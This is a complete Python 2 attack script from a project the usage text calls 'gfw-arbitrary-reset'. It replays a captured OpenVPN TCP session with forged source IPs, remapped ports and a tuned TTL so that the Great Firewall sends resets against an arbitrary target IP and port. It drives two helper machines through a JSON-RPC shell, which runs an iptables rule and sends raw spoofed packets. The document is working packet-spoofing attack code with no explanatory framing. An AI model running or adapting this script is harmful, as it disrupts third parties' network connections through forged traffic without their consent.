# suppress scapy IPv6 warning.
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from jsonrpclib import Server
from scapy.all import *
import random
import sys


if len(sys.argv) != 7:
    print "Usage: ", sys.argv[0], "<machine A IP>", "<machine A port>", "<machine B IP>", "<machine B port>", "<target IP>", "<target port>"
    print "See README.md or https://github.com/ccp0101/gfw-arbitrary-reset for more detail."
    sys.exit(0)
else:
    a_ip = sys.argv[1]
    a_port = int(sys.argv[2])
    b_ip = sys.argv[3]
    b_port = int(sys.argv[4])
    target_ip = sys.argv[5]
    target_port = int(sys.argv[6])


a_rpc = Server('http://%s:%d' % (a_ip, a_port))
b_rpc = Server('http://%s:%d' % (b_ip, b_port))


a_rpc.shell("/sbin/iptables -t filter -I OUTPUT -p tcp --destination %s --tcp-flags RST RST  -j DROP" % target_ip)
# b_rpc.shell("/sbin/iptables -t filter -I OUTPUT -p tcp --destination %s --tcp-flags RST RST  -j DROP" % a_ip)

# for Mac:
#  print client.shell("/sbin/ipfw add 100 drop ip from me to %s tcpflags rst" % ip)


source_ports_map = {}

def map_source_port(port):
    if port not in source_ports_map:
        new_port = random.randint(20000, 65500)
        source_ports_map[port] = new_port
        print "Created new port map: %d -> %d" % (port, new_port)
    return source_ports_map[port]


pkts = rdpcap("openvpn-tcp.dump")
seq = 0
for pkt in pkts:
    ip = pkt[IP]
    sender = ""
    if ip.src == "1.1.1.1":
        ip.dst = a_ip
        ip.src = target_ip
        ip.ttl = 64
        ip[TCP].sport = target_port
        ip[TCP].dport = map_source_port(pkt[TCP].dport)
        del ip.chksum
        del pkt[TCP].chksum
        b_rpc.raw_send(str(ip).encode("base64"))
        sender = "B,"
    else:
        ip.src = a_ip
        ip.dst = target_ip
        ip.ttl = 13  # choose a small TTL that's barely enough to pass through GFW.
        ip[TCP].dport = target_port
        ip[TCP].sport = map_source_port(pkt[TCP].sport)
        del ip.chksum
        del pkt[TCP].chksum
        a_rpc.raw_send(str(ip).encode("base64"))
        sender = "A,"
    print sender, "No: ", seq, ip.summary()
    seq += 1
